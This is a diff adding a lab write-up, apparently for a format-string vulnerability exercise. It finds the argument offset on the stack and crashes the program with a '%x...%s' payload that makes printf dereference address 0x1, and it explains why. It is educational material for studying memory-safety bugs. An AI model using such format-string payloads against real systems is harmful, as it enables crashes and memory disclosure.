@@ -1,0 +1,32 @@
+Task 5.1 Summary
+================
+
+Goal:
+Crash the vulnerable program via the format-string bug.
+
+Stack-slot discovery used for the later tasks:
+$ sed -n '1,20p' task01_stack_probe.txt
+The variable secret's address is 0x40800d38 (on stack)
+The variable secret's value is 0x40804040 (on heap)
+secret[0]'s address is 0x40804040 (on heap)
+secret[1]'s address is 0x40804044 (on heap)
+...
+MARK.40800d3c.40800eff.0.0.0.0.0.0.40804040.40804044.40804044.40804040.40804044.40804044.40804040.0.0.0.0.0.55667788.40804040.4b52414d...
+
+The probe shows that the decimal integer input appears as the 21st printf argument.
+
+Input used to crash the program:
+$ sed -n '1,10p' ../task01_input.txt
+1
+%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%s
+
+Why it crashes:
+- The 20 `%x` conversions consume the first 20 stack arguments.
+- The final `%s` uses the 21st argument, which is `int_input`.
+- With decimal integer `1`, `printf` tries to read a string from address `0x00000001`.
+- That invalid dereference causes a segmentation fault.
+
+Observed result:
+$ sed -n '1,20p' task01_run.txt
+The variable secret's address is 0x40800d38 (on stack)
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
